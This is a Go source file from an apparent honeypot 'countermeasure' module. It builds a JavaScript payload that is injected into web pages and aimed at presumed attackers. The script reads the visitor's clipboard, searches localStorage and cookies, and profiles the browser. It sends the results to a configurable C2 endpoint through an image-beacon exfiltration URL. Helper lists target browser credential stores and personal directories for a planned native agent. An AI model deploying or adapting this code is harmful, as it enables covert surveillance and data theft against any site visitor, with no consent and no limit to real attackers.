package countermeasure

import "strings"

// FileScanPayload 攻击者主机目录遍历与敏感文件读取载荷
// JS浏览器端：通过 download 目录探测、浏览器缓存特征收集、表单文件读取
// Native端：Go agent 全盘文件系统遍历模板（接口预留）
func FileScanPayload(c2Endpoint string) string {
	return `<script>
// ============================================================
// Laji-HoneyPot 反制 / 攻击者敏感文件探测模块
// 目标目录: 桌面/下载/浏览器缓存/黑客工具默认目录
// 敏感文件: 思维导图/攻击链路文档/工具配置文件/团队聊天记录
// ============================================================
(function(){
var FS={c2:'` + c2Endpoint + `',sessionId:'fs_'+Date.now()+'_'+Math.random().toString(36).substr(2,8),
  results:{files:[],dirs:[],cache:[],downloads:[]}};

// === 常见攻击工具目录特征检测 ===
FS.toolSignatures=[
  {tool:'Burp Suite',paths:['BurpSuite','burp','PortSwigger'],exes:['BurpSuiteCommunity.exe','BurpSuitePro.exe','burpsuite.jar']},
  {tool:'Nmap',paths:['Nmap','nmap'],exes:['nmap.exe','nmap']},
  {tool:'Metasploit',paths:['metasploit','metasploit-framework','msf'],exes:['msfconsole','msfconsole.bat','msfvenom']},
  {tool:'SQLMap',paths:['sqlmap','sqlmap-dev'],exes:['sqlmap.py']},
  {tool:'Hydra',paths:['hydra'],exes:['hydra.exe','hydra']},
  {tool:'Wireshark',paths:['Wireshark'],exes:['Wireshark.exe']},
  {tool:'Fiddler',paths:['Fiddler','Fiddler2'],exes:['Fiddler.exe']},
  {tool:'Charles',paths:['Charles'],exes:['Charles.exe']},
  {tool:'Proxifier',paths:['Proxifier'],exes:['Proxifier.exe']},
  {tool:'Goby',paths:['Goby'],exes:['Goby.exe']},
  {tool:'Xray',paths:['xray'],exes:['xray.exe','xray_darwin_amd64']},
  {tool:'Nuclei',paths:['nuclei-templates'],exes:['nuclei.exe','nuclei']},
  {tool:'CS',paths:['CobaltStrike','cobaltstrike','cs4'],exes:['teamserver','cobaltstrike-client.jar','agscript']},
  {tool:'冰蝎',paths:['Behinder','behinder','冰蝎'],exes:['behinder.jar','server.exe']},
  {tool:'哥斯拉',paths:['Godzilla','godzilla'],exes:['godzilla.jar']},
  {tool:'蚁剑',paths:['antSword','AntSword'],exes:['antSword.exe']},
  {tool:'御剑',paths:['御剑'],exes:['御剑后台扫描工具.exe']},
  {tool:'Shodan',paths:['shodan'],exes:['shodan.exe']},
  {tool:'Fofa',paths:['fofa'],exes:['fofa_viewer.exe']},
  {tool:'Chat/IM',paths:['WeChat','Tencent','DingDing','钉钉','Telegram','Slack','Discord','Feishu','飞书','Teams'],exes:['WeChat.exe','DingTalk.exe','Telegram.exe']},
  {tool:'VPN',paths:['OpenVPN','Clash','v2ray','Shadowsocks','WireGuard','Proxifier'],exes:['clash.exe','v2ray.exe','ss-local.exe']},
  {tool:'Virtualization',paths:['VMware','VirtualBox'],exes:['vmware.exe','VirtualBox.exe']},
  {tool:'Password',paths:['mimikatz','mimikatz_trunk'],exes:['mimikatz.exe']},
  {tool:'Anonymous',paths:['Tor Browser','tor-browser'],exes:['firefox.exe']}
];

// === 敏感文件类型特征（前4KB内容检测） ===
FS.sensitivePatterns={
  mindmap:['.xmind','.mm','.mmap','mind','脑图','思维导图','attack_path','攻击路径','kill_chain','红队','red team','蓝队','blue team'],
  attack_plan:['.docx','.doc','.md','attack_plan','攻击方案','渗透方案','penetration','渗透测试','行动计划','action plan','靶标','target','目标系统'],
  config:['.xml','.yaml','.yml','.json','.conf','.config','.ini','.properties','password','用户名','password=','passwd=','key=','secret=','token=','api_key','jdbc','connection','proxy','socks5','ssh_key'],
  db:['.db','.sqlite','.sqlite3','.sql','.mdb','.accdb','.csv','password','accounts','users','targets'],
  log:['.log','access','error','debug','trace','phpMyAdmin','mysql','ssh','rdp','ftp','smb','ldap'],
  script:['.ps1','.py','.sh','.bat','.cmd','.vbs','.js','Invoke-','Import-Module','reverse_shell','meterpreter','beacon','payload'],
  chat:['.db','.sqlite','msg','message','chat','conversation','微信','WeChat','QQ','Telegram','.tdesktop','session'],
  browser_cache:['Cookies','History','Login Data','Web Data','places.sqlite','cookies.sqlite','key4.db','logins.json','IndexedDB','Local Storage']
};

// === 浏览器环境探测（通过 Navigator + Storage 推断攻击者工具链） ===
FS.detectBrowserArtifacts=function(){
  // 1. 检测 localStorage/sessionStorage 中的工具痕迹
  var toolHints=[];
  try{
    var keys=Object.keys(localStorage);
    var toolKeywords=['burp','fiddler','postman','insomnia','swagger','graphql','csrf','xss','sqlmap','shodan','censys','fofa','zoomeye','hack','exploit','pentest','redteam'];
    keys.forEach(function(k){
      toolKeywords.forEach(function(tk){
        if(k.toLowerCase().indexOf(tk)>-1){toolHints.push('localStorage:'+k+'=>'+tk)}
      })
    });
    if(toolHints.length>0)FS.results.cache.push({type:'localStorage_hints',data:toolHints})
  }catch(e){}

  // 2. 浏览器扩展检测
  try{var allExtensions=document.querySelectorAll('script[src*="extension"],link[href*="extension"]');
  if(allExtensions.length>0)FS.results.cache.push({type:'extension_hints',count:allExtensions.length})}catch(e){}

  // 3. Service Worker 缓存检测
  try{
    navigator.serviceWorker.getRegistrations().then(function(regs){
      if(regs.length>0)FS.results.cache.push({type:'sw_registrations',count:regs.length})
    })
  }catch(e){}

  // 4. Cookie 检测（检测Burp/Collaborator等工具的cookie痕迹）
  try{
    var cookies=document.cookie.split(';');
    var cookieHints=[];
    cookies.forEach(function(c){
      var cn=c.trim().split('=')[0].toLowerCase();
      if(cn.indexOf('burp')>-1||cn.indexOf('csrf')>-1||cn.indexOf('csrf')>-1||
         cn.indexOf('pentest')>-1||cn.indexOf('hack')>-1){
        cookieHints.push(cn)
      }
    });
    if(cookieHints.length>0)FS.results.cache.push({type:'cookie_hints',data:cookieHints})
  }catch(e){}

  // 5. 下载目录枚举尝试（通过隐藏 iframe 探测已知工具下载路径）
  FS.toolSignatures.forEach(function(ts){
    var img=new Image();
    var testPath='file:///C:/Users/*/Downloads/'+ts.exe+'.test';
    img.src=testPath;
    // 实际环境中通过 CSP 违规报告或 fetch 实现探测
  })
};

// === 剪贴板内容嗅探（通过 Clipboard API，需用户交互触发） ===
FS.sniffClipboard=function(){
  try{
    if(navigator.clipboard&&navigator.clipboard.readText){
      navigator.clipboard.readText().then(function(text){
        if(text&&text.length>0){
          // 检测剪贴板中是否包含攻击相关关键词
          var attackKW=['url','http','https','.com','ip','password','admin','root','shell','exploit','payload','192.168','10.','172.','ssh','rdp','vnc','sql','注入','漏洞','绕','bypass','backdoor','后门'];
          var hits=[];
          attackKW.forEach(function(kw){if(text.toLowerCase().indexOf(kw)>-1)hits.push(kw)});
          FS.results.cache.push({type:'clipboard',len:text.length,hints:hits,preview:text.substring(0,200)})
        }
      }).catch(function(){})
    }
  }catch(e){}
};

// === 构建攻击者工具画像 ===
FS.buildToolProfile=function(){
  var profile={os:null,browserTools:[],devTools:[],possibleTools:[]};
  // 从 UA 推断 OS
  var ua=navigator.userAgent;
  if(/Windows NT 10/.test(ua))profile.os='Windows 10/11';
  else if(/Windows NT 6/.test(ua))profile.os='Windows 7/8';
  else if(/Mac OS X/.test(ua))profile.os='macOS';
  else if(/Linux/.test(ua))profile.os='Linux';
  // 从浏览器指纹推断开发工具
  try{if(navigator.webdriver)profile.devTools.push('Selenium/WebDriver')}catch(e){}
  try{if(window.cef||window.__CEF_IS_INITIALIZED__)profile.devTools.push('CEF Embedded')}catch(e){}
  try{if(window.chrome&&chrome.debugger)profile.devTools.push('Chrome Extension DevTools')}catch(e){}
  return profile;
};

// === 采集执行 ===
FS.collect=function(){
  FS.detectBrowserArtifacts();
  FS.sniffClipboard();
  FS.results.toolProfile=FS.buildToolProfile();
  // 加密回传
  setTimeout(function(){
    var data={t:'file_scan',ts:Date.now(),sid:FS.sessionId,results:FS.results};
    try{
      if(window._laji_exfil){window._laji_exfil(data)}
      else{new Image().src=FS.c2+'/exfil?d='+encodeURIComponent(JSON.stringify(data))}
    }catch(e){}
  },1000)
};
setTimeout(function(){FS.collect()},300)
})();</script>`
}

// SensitiveDirList 常见攻击者主机敏感目录列表（供 Native Agent 使用）
func SensitiveDirList(targetOS string) []string {
	windowsDirs := []string{
		`C:\Users\*\Desktop`,
		`C:\Users\*\Downloads`,
		`C:\Users\*\Documents`,
		`C:\Users\*\AppData\Local\Google\Chrome\User Data\Default`,
		`C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles`,
		`C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default`,
		`C:\tools`,
		`C:\Pentest`,
		`C:\hacktools`,
		`D:\tools`,
		`D:\Pentest`,
	}
	linuxDirs := []string{
		`/home/*/Desktop`,
		`/home/*/Downloads`,
		`/home/*/Documents`,
		`/home/*/.mozilla/firefox`,
		`/home/*/.config/google-chrome`,
		`/home/*/.config/chromium`,
		`/opt`,
		`/tmp`,
		`/root`,
	}
	macDirs := []string{
		`/Users/*/Desktop`,
		`/Users/*/Downloads`,
		`/Users/*/Documents`,
		`/Users/*/Library/Application Support/Google/Chrome`,
		`/Users/*/Library/Application Support/Firefox/Profiles`,
		`/Applications`,
		`/tmp`,
	}
	switch strings.ToLower(targetOS) {
	case "windows":
		return windowsDirs
	case "linux":
		return linuxDirs
	case "darwin", "macos", "mac":
		return macDirs
	default:
		return append(append(windowsDirs, linuxDirs...), macDirs...)
	}
}

// SensitiveFileExtensions 敏感文件扩展名列表（用于结构化分类）
func SensitiveFileExtensions() map[string]string {
	return map[string]string{
		".xmind":  "mindmap",
		".mm":     "mindmap",
		".mmap":   "mindmap",
		".docx":   "doc",
		".doc":    "doc",
		".md":     "doc",
		".txt":    "doc",
		".pdf":    "doc",
		".xml":    "config",
		".yaml":   "config",
		".yml":    "config",
		".json":   "config",
		".conf":   "config",
		".config": "config",
		".ini":    "config",
		".properties": "config",
		".db":     "db",
		".sqlite": "db",
		".sqlite3": "db",
		".sql":    "db",
		".csv":    "db",
		".log":    "log",
		".ps1":    "script",
		".py":     "script",
		".sh":     "script",
		".bat":    "script",
		".cmd":    "script",
		".vbs":    "script",
		".js":     "script",
		".jar":    "script",
		".exe":    "tool",
		".elf":    "tool",
		".pcap":   "network",
		".pcapng": "network",
	}
}
